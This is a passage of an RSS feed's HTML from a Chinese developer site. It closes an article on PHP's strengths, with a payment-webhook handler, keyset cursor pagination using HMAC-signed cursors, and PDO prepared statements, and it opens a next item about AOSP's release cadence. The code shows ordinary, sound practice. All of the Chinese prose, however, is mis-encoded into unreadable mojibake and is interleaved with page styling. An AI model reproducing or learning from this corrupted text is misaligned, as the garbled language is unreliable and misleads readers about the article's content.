        }
        <span class="hljs-variable">$paymentId</span> = (<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$event</span>-&gt;data[<span class="hljs-string">'payment_id'</span>] ?? <span class="hljs-string">''</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$paymentId</span> === <span class="hljs-string">''</span>) <span class="hljs-keyword">return</span>;
        <span class="hljs-keyword">match</span> (<span class="hljs-variable">$type</span>) {
            <span class="hljs-title class_">PaymentEventType</span>::<span class="hljs-variable constant_">PaymentSucceeded</span> =&gt; <span class="hljs-variable language_">$this</span>-&gt;payments-&gt;<span class="hljs-title function_ invoke__">markSucceeded</span>(<span class="hljs-variable">$paymentId</span>),
            <span class="hljs-title class_">PaymentEventType</span>::<span class="hljs-variable constant_">PaymentFailed</span>    =&gt; <span class="hljs-variable language_">$this</span>-&gt;payments-&gt;<span class="hljs-title function_ invoke__">markFailed</span>(<span class="hljs-variable">$paymentId</span>),
        };
    }
}
</code></pre>
<p>è¿™æ˜¯ä¸€ä¸ªå¹²å‡€çš„ç®¡é“ï¼š</p>
<ol>
<li>éªŒè¯çœŸå®æ€§</li>
<li>è§£æè½½è·</li>
<li>è§„èŒƒåŒ–ä¸º DTO</li>
<li>å¼ºåˆ¶å¹‚ç­‰æ€§</li>
<li>äº‹åŠ¡</li>
<li>åˆ†å‘é¢†åŸŸåŠ¨ä½œ</li>
<li>å®¹å¿æœªçŸ¥äº‹ä»¶</li>
</ol>
<p>è¿™å°±æ˜¯ PHP æ“…é•¿çš„"Web ç°å®"ä»£ç ï¼šå¤„ç†é‚£äº›çœŸæ­£é‡è¦çš„è„æ´»ï¼ŒåŒæ—¶ä¿æŒå¯è¯»ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ˜¯ä¼˜åŠ¿ä¸‰</strong>ï¼šå¤§å¤šæ•°åç«¯éƒ½æ˜¯æ•°æ®ç®¡é“ï¼Œè€Œ PHP åœ¨çœŸå®ä¸–ç•Œçº¦æŸä¸‹æ„å»ºå¯ç†è§£çš„ç®¡é“æ–¹é¢å¾ˆå¼ºã€‚</p>
<h3 data-id="heading-18">é¢å¤–å†…å®¹ï¼šæ¸¸æ ‡åˆ†é¡µçš„å®è·µæ·±å…¥ï¼ˆå› ä¸ºå®ƒæŠŠä¸‰ä¸ªä¼˜åŠ¿ä¸²åœ¨ä¸€èµ·ï¼‰</h3>
<p>åˆ†é¡µæ˜¯é‚£ç§çœ‹èµ·æ¥ç®€å•ã€ç­‰ç”¨æˆ·ç¿»åˆ°æ·±é¡µæ‰æš´éœ²é—®é¢˜çš„åŠŸèƒ½ã€‚å®ƒä¹Ÿæ˜¯ä¸ªå¥½ä¾‹å­ï¼Œèƒ½è¯´æ˜ PHP ä¸ºä½•è¿˜æ²¡è¿‡æ—¶ï¼šå®ƒåŒæ—¶æ¶‰åŠ HTTPã€SQL æ€§èƒ½å’Œå“åº”è®¾è®¡ã€‚</p>
<h4 data-id="heading-19">ä¸ºä»€ä¹ˆ OFFSET ä¼šä¼¤å®³ä½ </h4>
<p>Offset åˆ†é¡µï¼ˆ<code>LIMIT 20 OFFSET 100000</code>ï¼‰è¿«ä½¿æ•°æ®åº“æ‰«æå¹¶ä¸¢å¼ƒå¤§é‡è¡Œã€‚åœ¨å¤§è¡¨ä¸Šï¼Œæ·±é¡µä¼šå˜æ…¢ã€‚</p>
<p>å®ƒåœ¨å¹¶å‘å†™å…¥æ—¶ä¹Ÿå¯èƒ½ä¸ä¸€è‡´ï¼šæ’å…¥/åˆ é™¤å¯èƒ½å¯¼è‡´"çª—å£"ç§»åŠ¨æ—¶å‡ºç°è·³è¿‡æˆ–é‡å¤ã€‚</p>
<p>æ¸¸æ ‡åˆ†é¡µï¼ˆkeyset/seekï¼‰é€šè¿‡ä½¿ç”¨ç¨³å®šçš„æ’åºå’Œä»£è¡¨"ä½ ä¸Šæ¬¡åœåœ¨å“ªé‡Œ"çš„æ¸¸æ ‡æ¥é¿å…è¿™äº›é—®é¢˜ã€‚</p>
<h4 data-id="heading-20">è§„åˆ™ä¸€ï¼šæ¸¸æ ‡é€»è¾‘å¿…é¡»åŒ¹é…æ’åºæ–¹å‘</h4>
<p>å¦‚æœä½ æŒ‰æœ€æ–°ä¼˜å…ˆæ’åºï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> created_at <span class="hljs-keyword">DESC</span>, id <span class="hljs-keyword">DESC</span>
</code></pre>
<ul>
<li>ä¸‹ä¸€é¡µåº”è¯¥è·å–"æ›´æ—©"çš„è¡Œ</li>
<li>æ‰€ä»¥æ¡ä»¶ç”¨ <code>&lt;</code></li>
</ul>
<p>å¦‚æœä½ çš„æ•°æ®åº“æ”¯æŒå…ƒç»„æ¯”è¾ƒï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> id, created_at, total_cents
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> (created_at, id) <span class="hljs-operator">&lt;</span> (?, ?)
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> created_at <span class="hljs-keyword">DESC</span>, id <span class="hljs-keyword">DESC</span>
LIMIT ?
</code></pre>
<p>å¦‚æœä¸æ”¯æŒï¼Œç”¨æ˜¾å¼é€»è¾‘ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> id, created_at, total_cents
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> created_at <span class="hljs-operator">&lt;</span> ?
   <span class="hljs-keyword">OR</span> (created_at <span class="hljs-operator">=</span> ? <span class="hljs-keyword">AND</span> id <span class="hljs-operator">&lt;</span> ?)
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> created_at <span class="hljs-keyword">DESC</span>, id <span class="hljs-keyword">DESC</span>
LIMIT ?
</code></pre>
<h4 data-id="heading-21">è§„åˆ™äºŒï¼šæ¸¸æ ‡åº”è¯¥æ˜¯ä¸é€æ˜çš„ä¸”é˜²ç¯¡æ”¹</h4>
<p>æ¸¸æ ‡é€šå¸¸æ˜¯ä¸€ä¸ªç±»ä¼¼ <code>(created_at, id)</code> çš„å¯¹ï¼Œåºåˆ—åŒ–ç»™å®¢æˆ·ç«¯ã€‚Base64 ç¼–ç åœ¨ä¼ è¾“æ—¶æ²¡é—®é¢˜â€”â€”ä½†ä¸æ˜¯å®‰å…¨æªæ–½ã€‚å¦‚æœä½ æƒ³é˜²æ­¢å®¢æˆ·ç«¯ä¼ªé€ æ¸¸æ ‡ï¼Œå°±ç­¾åå®ƒã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cursor</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$createdAtIso</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$id</span>
    </span>) </span>{}
}
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CursorCodec</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$secret</span></span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params">Cursor <span class="hljs-variable">$cursor</span></span>): <span class="hljs-title">string</span>
    </span>{
        <span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">json_encode</span>([
            <span class="hljs-string">'created_at'</span> =&gt; <span class="hljs-variable">$cursor</span>-&gt;createdAtIso,
            <span class="hljs-string">'id'</span> =&gt; <span class="hljs-variable">$cursor</span>-&gt;id
        ], JSON_UNESCAPED_SLASHES);
        <span class="hljs-variable">$b64</span> = <span class="hljs-title function_ invoke__">rtrim</span>(<span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$json</span>), <span class="hljs-string">'+/'</span>, <span class="hljs-string">'-_'</span>), <span class="hljs-string">'='</span>);
        <span class="hljs-variable">$sig</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">'sha256'</span>, <span class="hljs-variable">$b64</span>, <span class="hljs-variable">$this</span>-&gt;secret);
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$b64</span> . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$sig</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$token</span></span>): <span class="hljs-title">Cursor</span>
    </span>{
        <span class="hljs-variable">$parts</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">'.'</span>, <span class="hljs-variable">$token</span>, <span class="hljs-number">2</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$parts</span>) !== <span class="hljs-number">2</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Invalid cursor'</span>);
        }
        [<span class="hljs-variable">$b64</span>, <span class="hljs-variable">$sig</span>] = <span class="hljs-variable">$parts</span>;
        <span class="hljs-variable">$expected</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">'sha256'</span>, <span class="hljs-variable">$b64</span>, <span class="hljs-variable">$this</span>-&gt;secret);
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">hash_equals</span>(<span class="hljs-variable">$expected</span>, <span class="hljs-variable">$sig</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Cursor signature mismatch'</span>);
        }
        <span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$b64</span>, <span class="hljs-string">'-_'</span>, <span class="hljs-string">'+/'</span>), <span class="hljs-literal">true</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$json</span> === <span class="hljs-literal">false</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Invalid cursor encoding'</span>);
        }
        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>);
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Invalid cursor payload'</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cursor</span>(
            createdAtIso: (<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$data</span>[<span class="hljs-string">'created_at'</span>] ?? <span class="hljs-string">''</span>),
            id: (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$data</span>[<span class="hljs-string">'id'</span>] ?? <span class="hljs-number">0</span>)
        );
    }
}
</code></pre>
<h4 data-id="heading-22">Repository æ–¹æ³•ï¼šè¿”å›æ¡ç›® + ä¸‹ä¸€ä¸ªæ¸¸æ ‡</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OrderRepository</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> PDO <span class="hljs-variable">$pdo</span></span>) </span>{}
    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@return</span> array{items: list&lt;array&gt;, next: ?Cursor}
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listPage</span>(<span class="hljs-params">?Cursor <span class="hljs-variable">$after</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-variable">$limit</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-number">1</span>, <span class="hljs-title function_ invoke__">min</span>(<span class="hljs-variable">$limit</span>, <span class="hljs-number">100</span>));
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$after</span> === <span class="hljs-literal">null</span>) {
            <span class="hljs-variable">$sql</span> = <span class="hljs-string">"SELECT id, created_at, total_cents
                    FROM orders
                    ORDER BY created_at DESC, id DESC
                    LIMIT :limit"</span>;
            <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;pdo-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);
            <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindValue</span>(<span class="hljs-string">':limit'</span>, <span class="hljs-variable">$limit</span>, PDO::<span class="hljs-variable constant_">PARAM_INT</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$sql</span> = <span class="hljs-string">"SELECT id, created_at, total_cents
                    FROM orders
                    WHERE created_at &lt; :created_at
                       OR (created_at = :created_at AND id &lt; :id)
                    ORDER BY created_at DESC, id DESC
                    LIMIT :limit"</span>;
            <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;pdo-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);
            <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindValue</span>(<span class="hljs-string">':created_at'</span>, <span class="hljs-variable">$after</span>-&gt;createdAtIso);
            <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindValue</span>(<span class="hljs-string">':id'</span>, <span class="hljs-variable">$after</span>-&gt;id, PDO::<span class="hljs-variable constant_">PARAM_INT</span>);
            <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindValue</span>(<span class="hljs-string">':limit'</span>, <span class="hljs-variable">$limit</span>, PDO::<span class="hljs-variable constant_">PARAM_INT</span>);
        }
        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();
        <span class="hljs-variable">$rows</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetchAll</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);
        <span class="hljs-variable">$items</span> = <span class="hljs-title function_ invoke__">array_map</span>(fn(<span class="hljs-variable">$r</span>) =&gt; [
            <span class="hljs-string">'id'</span> =&gt; (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$r</span>[<span class="hljs-string">'id'</span>],
            <span class="hljs-string">'created_at'</span> =&gt; (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$r</span>[<span class="hljs-string">'created_at'</span>],
            <span class="hljs-string">'total_cents'</span> =&gt; (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$r</span>[<span class="hljs-string">'total_cents'</span>],
        ], <span class="hljs-variable">$rows</span>);
        <span class="hljs-variable">$next</span> = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$items</span> !== []) {
            <span class="hljs-variable">$last</span> = <span class="hljs-variable">$items</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$items</span>) - <span class="hljs-number">1</span>];
            <span class="hljs-variable">$next</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cursor</span>(<span class="hljs-variable">$last</span>[<span class="hljs-string">'created_at'</span>], <span class="hljs-variable">$last</span>[<span class="hljs-string">'id'</span>]);
        }
        <span class="hljs-keyword">return</span> [<span class="hljs-string">'items'</span> =&gt; <span class="hljs-variable">$items</span>, <span class="hljs-string">'next'</span> =&gt; <span class="hljs-variable">$next</span>];
    }
}
</code></pre>
<p>ç°åœ¨ä½ çš„ handler å¯ä»¥è§£ç  <code>after</code>ã€è·å–ç»“æœã€ç¼–ç  <code>next_cursor</code>â€”â€”ä¸€ä¸ªæ¨ªè·¨ HTTP + SQL + JSON å“åº”çš„å¹²å‡€ç«¯åˆ°ç«¯ç®¡é“ã€‚</p>
<p>è¿™å°±æ˜¯å®è·µä¸­çš„æœ€ä½³å¹³è¡¡ç‚¹ï¼šPHP çš„ Web åŸç”Ÿç‰¹æ€§ã€ç”Ÿæ€å·¥å…·å’Œæ•°æ®å¤„ç†èƒ½åŠ›åœ¨è¿™é‡Œæ±‡åˆã€‚</p>
<h3 data-id="heading-23">PHP ä¸æ˜¯æœ€ä½³é»˜è®¤é€‰æ‹©çš„åœºæ™¯ï¼ˆä»¥åŠå¥½å›¢é˜Ÿæ€ä¹ˆåšï¼‰</h3>
<p>PHP ä¸æ˜¯ä¸‡èƒ½çš„æœ€ä½³å·¥å…·ï¼š</p>
<ul>
<li>CPU å¯†é›†å‹å·¥ä½œè´Ÿè½½ï¼ˆè§†é¢‘å¤„ç†ã€å¤§è§„æ¨¡æ•°å€¼è®¡ç®—ï¼‰</li>
<li>å°†æé«˜å¹¶å‘çš„ socket æœåŠ¡å™¨ä½œä¸ºé»˜è®¤æ¶æ„</li>
<li>è¦æ±‚å‰åç«¯ç”¨åŒä¸€é—¨è¯­è¨€å…±äº«ä¸¥æ ¼ç±»å‹çš„ç»„ç»‡</li>
</ul>
<p>ä½†å¤§å¤šæ•°æˆåŠŸçš„å›¢é˜Ÿä¸ä¼šæŠŠè¿™å½“æˆé‡å†™ä¸€åˆ‡çš„ç†ç”±ã€‚ä»–ä»¬åšçš„æ˜¯ Web ä¸€ç›´é¼“åŠ±çš„äº‹ï¼šç»„åˆç³»ç»Ÿã€‚</p>
<ul>
<li>åœ¨ PHP å¼ºçš„åœ°æ–¹ä¿ç•™ API è¡¨é¢ã€‚</li>
<li>æŠŠé‡è®¡ç®—å¸è½½ç»™ worker æˆ–ä¸“é—¨çš„æœåŠ¡ã€‚</li>
<li>ç”¨é˜Ÿåˆ—å¤„ç†åå°ä»»åŠ¡ã€‚</li>
<li>åœ¨æ€ªç½ªè¯­è¨€ä¹‹å‰å…ˆä¼˜åŒ–æ•°æ®åº“æŸ¥è¯¢å’Œç¼“å­˜ã€‚</li>
</ul>
<p>è¿™ä¸æ˜¯ä»€ä¹ˆ"PHP ç”¨æˆ·çš„è‡ªæˆ‘å®‰æ…°"ï¼Œè¿™å°±æ˜¯æ­£å¸¸çš„ç³»ç»Ÿè®¾è®¡ã€‚</p>
<h3 data-id="heading-24">ç»“è®º</h3>
<p>å›åˆ°æœ€åˆçš„é—®é¢˜â€”â€”PHP çš„ä¸‰å¤§ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>Web åŸç”Ÿçš„ç”Ÿäº§åŠ›</strong>ï¼šPHP å¤©ç„¶å¥‘åˆ HTTP å·¥ä½œï¼Œä¿æŒæ„å»ºå¾ªç¯å¿«é€Ÿã€‚</li>
<li><strong>ç”Ÿæ€æˆç†Ÿåº¦</strong>ï¼šComposer + æ¡†æ¶ + æ ‡å‡† + å·¥å…·é“¾ç»™ä½ æ æ†å¹¶é™ä½é£é™©ã€‚</li>
<li><strong>åŠ¡å®çš„æ•°æ®ç®¡é“</strong>ï¼šPHP æ“…é•¿æŠŠæ··ä¹±çš„çœŸå®ä¸–ç•Œæ•°æ®è½¬æ¢æˆå¹²å‡€ã€ç¨³å®šçš„è¾“å‡ºâ€”â€”åŒæ—¶ä¸è®©ä»£ç å˜å¾—ä¸å¯è¯»ã€‚</li>
</ul>
<p>å¦‚æœä½ æƒ³è®© PHP æ„Ÿè§‰ç°ä»£ï¼ˆè€Œä¸æ˜¯åƒé‚£äº›åˆ»æ¿å°è±¡ï¼‰ï¼Œæ–¹æ³•å§‹ç»ˆå¦‚ä¸€ï¼š</p>
<ul>
<li>ä¿æŒ handler/æ§åˆ¶å™¨è–„</li>
<li>ç”¨ DTO/å€¼å¯¹è±¡å»ºæ¨¡è¾¹ç•Œ</li>
<li>æŠŠè¶…æ—¶ã€é‡è¯•å’Œå¹‚ç­‰æ€§å½“ä½œä¸€ç­‰åŠŸèƒ½</li>
<li>æŒ‰è¯»å–æ–¹å¼å»ºç´¢å¼•ï¼ˆå°¤å…¶æ˜¯åˆ†é¡µï¼‰</li>
<li>ç”¨æµ‹è¯• + é™æ€åˆ†æä¿æŠ¤é‡æ„</li>
</ul>
<p>PHP ä¸éœ€è¦è¿½çƒ­ç‚¹ã€‚å®ƒåªè¦ç»§ç»­åšå®ƒæ“…é•¿çš„äº‹å°±å¤Ÿäº†ï¼šè·‘é‚£äº›å®ç”¨ã€å¥½ç»´æŠ¤ã€èƒ½ç¨³å®šä¸Šçº¿çš„ Web ç³»ç»Ÿã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AOSP å‘å¸ƒèŠ‚å¥è°ƒæ•´ï¼šä¸€å¹´ä¸¤æ›´]]></title>    <link>https://juejin.cn/post/7592440247956701199</link>    <guid>https://juejin.cn/post/7592440247956701199</guid>    <pubDate>2026-01-08T00:28:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592440247956701199" data-draft-id="7592148975849242667" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AOSP å‘å¸ƒèŠ‚å¥è°ƒæ•´ï¼šä¸€å¹´ä¸¤æ›´"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-08T00:28:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AOSP å‘å¸ƒèŠ‚å¥è°ƒæ•´ï¼šä¸€å¹´ä¸¤æ›´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T00:28:11.000Z" title="Thu Jan 08 2026 00:28:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6c4d0cc6ebd4c6b820b406207267dac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768436890&amp;x-signature=hSPV2T575WDVctYlObs38%2B3pYtg%3D" alt="0107_1.png" loading="lazy"/></p>
